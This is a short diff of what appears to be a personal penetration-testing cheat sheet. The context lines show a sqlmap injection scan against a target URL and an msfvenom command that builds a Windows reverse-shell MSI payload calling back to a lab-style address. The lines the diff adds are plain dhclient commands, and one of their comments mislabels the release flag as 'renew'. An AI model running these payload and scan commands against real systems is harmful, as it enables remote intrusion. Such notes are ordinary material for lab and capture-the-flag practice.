@@ -92,3 +92,9 @@ sqlmap - look for injections -- sqlmap -u 'http://target/dashboard.php?search=an
 # MSFVenom
 msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=444 -f msi -o rev.msi
 
+# Force DHCP Addr
+sudo dhclient 
+sudo dhclient -r  # renew
+
+
+
